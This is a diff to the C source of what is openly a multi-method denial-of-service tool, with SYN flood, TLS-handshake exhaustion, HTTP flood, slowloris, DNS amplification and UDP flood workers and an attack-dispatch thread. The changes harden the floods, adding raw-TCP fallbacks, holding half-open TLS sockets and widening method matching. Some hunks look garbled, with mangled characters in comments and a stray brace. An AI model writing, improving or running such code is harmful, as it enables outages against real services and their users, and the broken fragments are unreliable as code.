@@ -182,7 +182,7 @@ static void *syn_worker(void *arg) {
     pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);
 
     int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
-    if (s < 0) { close(s); return NULL; }
+    if (s < 0) return NULL;
     int one = 1;
     setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
 
@@ -277,15 +277,13 @@ static void *tls_exhaust_worker(void *arg) {
             SSL *ssl = SSL_new(ctx);
             SSL_set_fd(ssl, s);
             SSL_set_tlsext_host_name(ssl, mt->host);
+            SSL_connect(ssl);  /* fire and forget — handshake pkt sent to kernel */
+            SSL_free(ssl);     /* TCP socket stays alive independently */
 
-            /* Non-blocking SSL handshake attempt */
-            int r = SSL_connect(ssl);
-            if (r <= 0) {
-                int e = SSL_get_error(ssl, r);
-                if (e == SSL_ERROR_WANT_READ || e == SSL_ERROR_WANT_WRITE) {
-                    /* Handshake started but not complete Ã¢â‚¬â€ connection held mid-handshake */
-                    /* Track in pool so we don't close it */
-                }
+            socks[pool] = s;
+            pool++;
+            pkt_sent(512);
+        }
             }
             /* Keep connection Ã¢â‚¬â€ mid-handshake or partial */
             socks[pool] = s;
@@ -367,9 +365,13 @@ static void *http_worker(void *arg) {
             if (tcp_connect_wait(s, &mt->target, 2000) < 0) { close(s); continue; }
 
             SSL *ssl = SSL_new(ctx);
-            SSL_set_fd(ssl, s);
-            SSL_set_tlsext_host_name(ssl, mt->host);
-            if (SSL_connect(ssl) != 1) { SSL_free(ssl); close(s); continue; }
+            int use_ssl = 0;
+            if (ssl) {
+                SSL_set_fd(ssl, s);
+                SSL_set_tlsext_host_name(ssl, mt->host);
+                use_ssl = (SSL_connect(ssl) == 1);
+                if (!use_ssl) SSL_free(ssl);
+            }
 
             char req[4096];
             const char *ua = uas[rand_r(&seed) % 3];
@@ -380,18 +382,22 @@ static void *http_worker(void *arg) {
                      "Accept-Language: en-US,en;q=0.9\r\n"
                      "Connection: keep-alive\r\n\r\n",
                      path, mt->host, ua);
-            SSL_write(ssl, req, (int)strlen(req));
+            if (use_ssl)
+                SSL_write(ssl, req, (int)strlen(req));
+            else
+                send(s, req, strlen(req), MSG_NOSIGNAL);
 
             /* Read response quickly */
             char rbuf[4096];
             struct pollfd pfd = { .fd = s, .events = POLLIN };
-            if (poll(&pfd, 1, 2000) > 0)
-                SSL_read(ssl, rbuf, sizeof(rbuf));
+            if (poll(&pfd, 1, 2000) > 0) {
+                if (use_ssl) SSL_read(ssl, rbuf, sizeof(rbuf));
+                else recv(s, rbuf, sizeof(rbuf), 0);
+            }
             pkt_sent((int)strlen(req) + 256);
-            SSL_free(ssl);
+            if (use_ssl) SSL_free(ssl);
             close(s);
         }
-        /* Brief rest to avoid local port exhaustion */
         usleep(10000);
     }
     SSL_CTX_free(ctx);
@@ -434,12 +440,20 @@ static void *slowloris_worker(void *arg) {
             SSL *ssl = SSL_new(ctx);
             SSL_set_fd(ssl, s);
             SSL_set_tlsext_host_name(ssl, mt->host);
-            if (SSL_connect(ssl) != 1) { SSL_free(ssl); close(s); continue; }
+            int tls_ok = (SSL_connect(ssl) == 1);
+            if (!tls_ok) {
+                SSL_free(ssl);
+                ssl = NULL; /* fall back to raw TCP — no TLS */
+            }
 
             /* Send partial request header */
             char hdr[512];
             snprintf(hdr, sizeof(hdr), "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nX-", mt->host);
-            SSL_write(ssl, hdr, (int)strlen(hdr));
+            if (ssl)
+                SSL_write(ssl, hdr, (int)strlen(hdr));
+            else
+                send(s, hdr, strlen(hdr), MSG_NOSIGNAL);
+
             socks[pool] = s;
             ssls[pool] = ssl;
             last_drip[pool] = time(NULL);
@@ -454,7 +468,10 @@ static void *slowloris_worker(void *arg) {
             if (now - last_drip[i] >= interval) {
                 char drip[64];
                 snprintf(drip, sizeof(drip), "X-%x: %x\r\n", rand_r(&seed) & 0xFFF, rand_r(&seed) & 0xFFF);
-                SSL_write(ssls[i], drip, (int)strlen(drip));
+                if (ssls[i])
+                    SSL_write(ssls[i], drip, (int)strlen(drip));
+                else
+                    send(socks[i], drip, strlen(drip), MSG_NOSIGNAL);
                 last_drip[i] = now;
                 pkt_sent((int)strlen(drip));
             }
@@ -472,7 +489,7 @@ static void *slowloris_worker(void *arg) {
                 int w = 0;
                 for (int i = 0; i < pool; i++) {
                     if (pfds[i].revents & (POLLERR | POLLHUP)) {
-                        SSL_free(ssls[i]);
+                        if (ssls[i]) SSL_free(ssls[i]);
                         close(socks[i]);
                     } else {
                         if (w != i) { socks[w] = socks[i]; ssls[w] = ssls[i]; last_drip[w] = last_drip[i]; }
@@ -484,7 +501,7 @@ static void *slowloris_worker(void *arg) {
             free(pfds);
         }
     }
-    for (int i = 0; i < pool; i++) { SSL_free(ssls[i]); close(socks[i]); }
+    for (int i = 0; i < pool; i++) { if (ssls[i]) SSL_free(ssls[i]); close(socks[i]); }
     SSL_CTX_free(ctx);
     free(socks); free(ssls); free(last_drip);
     return NULL;
@@ -595,15 +612,20 @@ void *bg_attack_thread(void *arg)
     g_byte_count = 0;
 
     const char *method = atk->method;
-    int mega = atk->mega_mode || !strcmp(method, "MEGA") || !strcmp(method, "UDP");
-    int is_syn    = !strcmp(method, "SYN");
-    int is_tls    = atk->tls_exhaust || !strcmp(method, "TLS_EXHAUST");
-    int is_http   = !strcmp(method, "HTTP");
-    int is_slow   = atk->slowloris || !strcmp(method, "SLOWLORIS");
-    int is_dns    = atk->dns_amp || !strcmp(method, "DNS_AMP");
-
-    /* Default to UDP MEGA if no specific method */
-    int is_udp = !strcmp(method, "UDP") || !strcmp(method, "MEGA");
+    /* Normalize method to uppercase for case-insensitive matching */
+    char nm[32] = {0};
+    {
+        int j = 0;
+        for (const char *p = method; *p && j < 31; p++)
+            nm[j++] = (char)((*p >= 'a' && *p <= 'z') ? *p - 32 : *p);
+    }
+    int mega = atk->mega_mode || !strcmp(nm, "MEGA") || !strcmp(nm, "UDP");
+    int is_syn    = !strcmp(nm, "SYN");
+    int is_tls    = atk->tls_exhaust || !strcmp(nm, "TLS_EXHAUST") || !strcmp(nm, "TLS");
+    int is_http   = !strcmp(nm, "HTTP");
+    int is_slow   = atk->slowloris || !strcmp(nm, "SLOWLORIS");
+    int is_dns    = atk->dns_amp || !strcmp(nm, "DNS_AMP");
+    int is_udp = !strcmp(nm, "UDP") || !strcmp(nm, "MEGA");
     if (!is_syn && !is_tls && !is_http && !is_slow && !is_dns && !is_udp) {
         fprintf(stderr, "[atk] unknown method, abort\n");
         set_attack_active(0);
